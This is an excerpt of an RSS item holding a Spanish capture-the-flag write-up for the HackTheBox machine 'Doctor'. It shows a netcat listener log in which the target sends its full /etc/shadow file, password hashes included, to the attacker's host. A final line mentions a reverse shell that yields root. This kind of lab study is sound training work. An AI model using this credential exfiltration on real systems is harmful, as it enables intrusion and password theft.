&lt;div id=&#34;46f6b7241b435770&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  kali@kali:~/htb/doctor$ nc -lvvvp &lt;span class=&#34;m&#34;&gt;8081&lt;/span&gt;
  listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8081&lt;/span&gt; ...
  connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.224&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from doctor.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.209&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;44140&lt;/span&gt;
  POST / HTTP/1.1
  Host: 10.10.14.224:8081
  User-Agent: curl/7.68.0
  Accept: */*
  Content-Length: &lt;span class=&#34;m&#34;&gt;1976&lt;/span&gt;
  Content-Type: multipart/form-data&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;boundary&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;------------------------56671751738f1529
  Expect: 100-continue

  --------------------------56671751738f1529
  Content-Disposition: form-data&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;shadow&amp;#34;&lt;/span&gt;
  Content-Type: application/octet-stream

  root:&lt;span class=&#34;nv&#34;&gt;$6$384&lt;/span&gt;TbSO3bB1PWLT1&lt;span class=&#34;nv&#34;&gt;$U8U&lt;/span&gt;.j.zBLXobhorPDxOMRZh4eE86lcn7C0dvqRvfJ9qDzreti8HDvXwFZccDat9/HJRNwu04ErVxo3mUwVbs5.:18512:0:99999:7:::
  daemon:*:18375:0:99999:7:::
  bin:*:18375:0:99999:7:::
  sys:*:18375:0:99999:7:::
  sync:*:18375:0:99999:7:::
  games:*:18375:0:99999:7:::
  man:*:18375:0:99999:7:::
  lp:*:18375:0:99999:7:::
  mail:*:18375:0:99999:7:::
  news:*:18375:0:99999:7:::
  uucp:*:18375:0:99999:7:::
  proxy:*:18375:0:99999:7:::
  www-data:*:18375:0:99999:7:::
  backup:*:18375:0:99999:7:::
  list:*:18375:0:99999:7:::
  irc:*:18375:0:99999:7:::
  gnats:*:18375:0:99999:7:::
  nobody:*:18375:0:99999:7:::
  systemd-network:*:18375:0:99999:7:::
  systemd-resolve:*:18375:0:99999:7:::
  systemd-timesync:*:18375:0:99999:7:::
  messagebus:*:18375:0:99999:7:::
  syslog:*:18375:0:99999:7:::
  _apt:*:18375:0:99999:7:::
  tss:*:18375:0:99999:7:::
  uuidd:*:18375:0:99999:7:::
  tcpdump:*:18375:0:99999:7:::
  avahi-autoipd:*:18375:0:99999:7:::
  usbmux:*:18375:0:99999:7:::
  rtkit:*:18375:0:99999:7:::
  dnsmasq:*:18375:0:99999:7:::
  cups-pk-helper:*:18375:0:99999:7:::
  speech-dispatcher:!:18375:0:99999:7:::
  avahi:*:18375:0:99999:7:::
  kernoops:*:18375:0:99999:7:::
  saned:*:18375:0:99999:7:::
  nm-openvpn:*:18375:0:99999:7:::
  hplip:*:18375:0:99999:7:::
  whoopsie:*:18375:0:99999:7:::
  colord:*:18375:0:99999:7:::
  geoclue:*:18375:0:99999:7:::
  pulse:*:18375:0:99999:7:::
  gnome-initial-setup:*:18375:0:99999:7:::
  systemd-coredump:!!:18463::::::
  web:&lt;span class=&#34;nv&#34;&gt;$6$luVwBTOn1q154RLG$KKPgd66FyKM6z&lt;/span&gt;.hCPPvOYEVNoZgj/sAagvMrzWSoKrnWICgHo8oRGPzt5glRc7lm6lDfbwk3OUCIfBkYeeCHG0:18463:0:99999:7:::
  _rpc:*:18464:0:99999:7:::
  statd:*:18464:0:99999:7:::
  exim:!:18469:0:99999:7:::
  sshd:*:18469:0:99999:7:::
  shaun:&lt;span class=&#34;nv&#34;&gt;$6$xEyi3OGI4XZfW7uM$dPxAIWOZuAFwJj4W69VGT&lt;/span&gt;.T1YLlnEvvaphLjswVs4hv5RUtJ7v7F37XfPtwst9Ije3imy4gRcRppsAZLQ81z80:18519:0:99999:7:::
  splunk:!:18511:0:99999:7:::

  --------------------------56671751738f1529--
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;


&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;59d3b08e224b5fa0\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;p&gt;Ejecutamos una shell inversa con lo que logramos obtener shell con usuario root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3021.36.03.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/doctor/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/doctor/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>splunkd</category>
            
          
            
              <category>python</category>
            
          
            
              <category>ssti</category>
            
          
            
              <category>injection</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>